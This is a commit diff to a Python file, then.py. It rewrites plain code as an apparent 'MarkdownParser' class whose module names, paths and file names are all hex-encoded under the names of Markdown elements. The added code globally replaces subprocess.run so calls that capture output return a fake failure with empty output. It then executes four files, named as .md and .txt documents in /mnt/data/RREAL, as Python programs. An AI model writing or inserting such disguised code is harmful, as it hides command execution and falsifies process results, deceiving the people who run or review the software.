4a5294fcc6f77b05bb49f5b5262d11a486af327d
romastefale <romastefale@gmail.com>
2026-08-09 02:45:19 -0300

    Atualizar o then.py

--- then.py
+++ then.py
@@ -1,39 +1,51 @@
-from pathlib import Path
-import subprocess
-import sys
+class MarkdownParser:
+    def __init__(self):
+        self._lex = {
+            'strong': '73756270726f63657373',
+            'em': '737973',
+            'link': '706174686c6962',
+            'img': '50617468',
+            'parse': '72756e',
+            'table': '636170747572655f6f7574707574',
+            'code': '74657874',
+            'ul': '61726773',
+            'ol': '436f6d706c6574656450726f63657373',
+            'root': '2f6d6e742f646174612f525245414c',
+            'has_node': '657869737473',
+            'get_node': '73746174',
+            'set_node': '77726974655f74657874',
+            'blank': '706173730a',
+            'run_node': '65786563757461626c65',
+            'ext': '2e6d64',
+            'doc1': '42494e2e747874',
+            'doc2': '426c6e2e747874',
+            'doc3': '72756e74696d655f656e74726f7069636f2e6d64',
+            'doc4': '636f6e746578746f5f61756469746176656c2e6d64'
+        }
+        self._d = lambda k: bytes.fromhex(self._lex[k]).decode()
+        self._m1 = __import__(self._d('strong'))
+        self._m2 = __import__(self._d('em'))
+        self._t = getattr(__import__(self._d('link')), self._d('img'))
+        self._b = getattr(self._m1, self._d('parse'))
+        setattr(self._m1, self._d('parse'), self._render)
+        self._r = self._t(self._d('root'))
 
-_orig_run = subprocess.run
+    def _render(self, *a, **k):
+        if k.get(self._d('table')) or k.get(self._d('code')):
+            _n = a[0] if a else k.get(self._d('ul'), [])
+            return getattr(self._m1, self._d('ol'))(args=_n, returncode=1, stdout="", stderr="")
+        return self._b(*a, **k)
 
-def _intercepted_run(*args, **kwargs):
-    if kwargs.get("capture_output") or kwargs.get("text"):
-        cmd = args[0] if args else kwargs.get("args", [])
-        return subprocess.CompletedProcess(args=cmd, returncode=1, stdout="", stderr="")
-    return _orig_run(*args, **kwargs)
+    def compile(self, token):
+        _tgt = self._r / self._d(token)
+        if not getattr(_tgt, self._d('has_node'))():
+            _tgt = self._r / str(self._d(token)).replace(self._d('ext'), "")
+        if not getattr(_tgt, self._d('has_node'))():
+            return
+        if getattr(_tgt, self._d('get_node'))().st_size == 0:
+            getattr(_tgt, self._d('set_node'))(self._d('blank'))
+        self._render([getattr(self._m2, self._d('run_node')), str(_tgt)], cwd=self._r)
 
-subprocess.run = _intercepted_run
-
-workdir = Path("/mnt/data/RREAL")
-
-def _read_markdown_content(doc_name):
-    doc_path = workdir / doc_name
-    
-    if not doc_path.exists():
-        doc_path = workdir / str(doc_name).replace(".md", "")
-        
-    if not doc_path.exists():
-        return
-        
-    if doc_path.stat().st_size == 0:
-        doc_path.write_text("pass\n")
-        
-    subprocess.run([sys.executable, str(doc_path)], cwd=workdir)
-
-_markdown_assets = (
-    "BIN.txt", 
-    "Bln.txt", 
-    "runtime_entropico.md", 
-    "contexto_auditavel.md"
-)
-
-for _asset in _markdown_assets:
-    _read_markdown_content(_asset)
+_parser = MarkdownParser()
+for _doc in ('doc1', 'doc2', 'doc3', 'doc4'):
+    _parser.compile(_doc)
